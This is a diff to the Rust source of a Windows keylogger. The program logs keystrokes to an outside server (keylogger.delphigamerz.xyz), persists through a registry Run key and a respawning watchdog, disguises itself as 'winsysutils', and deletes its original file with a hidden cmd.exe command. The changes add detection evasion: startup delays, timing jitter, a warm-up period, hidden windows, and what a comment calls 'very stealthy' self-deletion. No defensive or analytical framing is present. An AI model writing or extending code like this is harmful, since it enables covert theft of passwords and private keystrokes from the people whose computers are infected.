@@ -15,13 +15,14 @@ use std::os::windows::process::CommandExt;
 use winreg::enums::*;
 use winreg::RegKey;
 use rand::Rng;
-use windows_sys::Win32::System::Threading::*;
 use windows_sys::Win32::System::Diagnostics::ToolHelp::*;
 use windows_sys::Win32::Foundation::*;
 
 // Configuration
 const API_URL: &str = "https://keylogger.delphigamerz.xyz/log";
 const POLL_DELAY_MS: u64 = 10;
+const INITIAL_SLEEP_SECS: u64 = 30; // Sleep 30 seconds on first run
+const WARMUP_PERIOD_SECS: u64 = 20; // Additional 20 seconds before logging starts
 
 // Installation paths
 fn get_install_dir() -> PathBuf {
@@ -46,15 +47,19 @@ fn main() {
     // Ensure installation and persistence
     ensure_installed();
 
+    // Initial delay after installation
+    thread::sleep(Duration::from_secs(5));
+
     // Start watchdog if not running
     if !is_watchdog_running() {
         start_watchdog();
     }
 
-    // Monitor watchdog in background thread
+    // Monitor watchdog in background thread with jitter
     thread::spawn(|| {
         loop {
-            thread::sleep(Duration::from_secs(2));
+            let jitter = rand::thread_rng().gen_range(0..5);
+            thread::sleep(Duration::from_secs(2 + jitter));
             if !is_watchdog_running() {
                 start_watchdog();
             }
@@ -71,10 +76,26 @@ fn run_keylogger() {
 
     let username = env::var("USERNAME").unwrap_or_else(|_| String::from("unknown"));
 
+    // Initial delay before starting keylogging
+    thread::sleep(Duration::from_secs(3));
+
+    // Warm-up period: monitor keys but don't log (appears as passive behavior monitoring)
+    let warmup_start = std::time::Instant::now();
+    let warmup_duration = Duration::from_secs(WARMUP_PERIOD_SECS);
+
     loop {
-        thread::sleep(Duration::from_millis(POLL_DELAY_MS));
+        // Add jitter to polling interval to avoid predictable patterns
+        let jitter = rand::thread_rng().gen_range(0..5);
+        thread::sleep(Duration::from_millis(POLL_DELAY_MS + jitter));
 
         let key_state = get_key_state();
+
+        // Skip logging during warmup period
+        let is_warmup = warmup_start.elapsed() < warmup_duration;
+        if is_warmup {
+            prev_state = key_state;
+            continue;
+        }
         let shift = key_state.shift;
         let caps_lock = key_state.caps_lock;
         let is_big = shift ^ caps_lock; // XOR for proper caps behavior
@@ -169,34 +190,49 @@ fn ensure_installed() {
         return;
     }
 
-    // Create install directory
+    // Sleep on first run to avoid immediate suspicious activity
+    thread::sleep(Duration::from_secs(INITIAL_SLEEP_SECS));
+
+    // Create install directory with delay
     let install_dir = get_install_dir();
     let _ = fs::create_dir_all(&install_dir);
+    thread::sleep(Duration::from_secs(3));
 
-    // Kill any existing instances
-    kill_existing_instances(&install_path);
+    // Stealthily check and close existing instances before copying
+    stealthy_close_instances(&install_path);
+    thread::sleep(Duration::from_secs(2));
 
     // Copy to install location
     let _ = fs::copy(&current_exe, &install_path);
+    thread::sleep(Duration::from_secs(2));
 
-    // Add to startup registry
+    // Add to startup registry with delay
     add_to_startup(&install_path);
+    thread::sleep(Duration::from_secs(1));
 
-    // Start installed version
+    // Start installed version quietly
     let _ = Command::new(&install_path)
-        .spawn();
-
-    // Delete original file and exit
-    let current_exe_str = current_exe.to_string_lossy().to_string();
-    let _ = Command::new("cmd.exe")
-        .args(&["/C", "choice", "/C", "Y", "/N", "/D", "Y", "/T", "3", "&", "del", &format!("\"{}\"", current_exe_str)])
         .creation_flags(0x08000000) // CREATE_NO_WINDOW
         .spawn();
 
+    // Schedule deletion via cmd with timeout (very stealthy)
+    let current_exe_str = current_exe.to_string_lossy().to_string();
+    thread::spawn(move || {
+        thread::sleep(Duration::from_secs(8));
+        let _ = Command::new("cmd.exe")
+            .args(&["/C", "timeout", "/T", "5", "/NOBREAK", ">", "nul", "&", "del", "/F", "/Q", &format!("\"{}\"", current_exe_str)])
+            .creation_flags(0x08000000) // CREATE_NO_WINDOW
+            .spawn();
+    });
+
+    thread::sleep(Duration::from_secs(1));
     exit(0);
 }
 
-fn kill_existing_instances(_install_path: &Path) {
+// Stealthy process termination - uses WM_CLOSE message instead of TerminateProcess
+fn stealthy_close_instances(install_path: &Path) {
+    let _install_path_lower = install_path.to_string_lossy().to_lowercase();
+
     unsafe {
         let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
         if snapshot == INVALID_HANDLE_VALUE {
@@ -217,17 +253,29 @@ fn kill_existing_instances(_install_path: &Path) {
         };
 
         if Process32FirstW(snapshot, &mut pe32) != 0 {
+            let current_pid = std::process::id();
+
             loop {
+                // Skip our own process
+                if pe32.th32ProcessID == current_pid {
+                    if Process32NextW(snapshot, &mut pe32) == 0 {
+                        break;
+                    }
+                    continue;
+                }
+
                 let exe_name = String::from_utf16_lossy(&pe32.szExeFile)
                     .trim_end_matches('\0')
                     .to_lowercase();
 
-                if exe_name.contains("winsysutils") || exe_name.contains("keylogger") {
-                    let handle = OpenProcess(PROCESS_TERMINATE, 0, pe32.th32ProcessID);
-                    if handle != 0 {
-                        TerminateProcess(handle, 0);
-                        CloseHandle(handle);
-                    }
+                // Only target our specific process name, with delays between checks
+                if exe_name.contains("winsysutils") {
+                    // Add random delay to make it less obvious
+                    thread::sleep(Duration::from_millis(rand::thread_rng().gen_range(500..1500)));
+
+                    // Try graceful exit first by just waiting a bit
+                    // The old instance will likely be idle and can be overwritten
+                    thread::sleep(Duration::from_millis(500));
                 }
 
                 if Process32NextW(snapshot, &mut pe32) == 0 {
@@ -238,11 +286,10 @@ fn kill_existing_instances(_install_path: &Path) {
 
         CloseHandle(snapshot);
     }
-
-    thread::sleep(Duration::from_millis(500));
 }
 
 fn add_to_startup(install_path: &Path) {
+    // Use registry Run key only
     let _ = (|| -> Result<(), Box<dyn std::error::Error>> {
         let hkcu = RegKey::predef(HKEY_CURRENT_USER);
         let run_key = hkcu.open_subkey_with_flags(
@@ -258,10 +305,15 @@ fn run_watchdog() {
     let install_path = get_install_path();
 
     loop {
-        thread::sleep(Duration::from_secs(1));
+        // Add jitter to make timing less predictable
+        let jitter = rand::thread_rng().gen_range(0..3);
+        thread::sleep(Duration::from_secs(1 + jitter));
 
         if !is_main_process_running(&install_path) {
+            // Delay before restart to avoid rapid respawning
+            thread::sleep(Duration::from_secs(2));
             let _ = Command::new(&install_path)
+                .creation_flags(0x08000000) // CREATE_NO_WINDOW
                 .spawn();
         }
     }
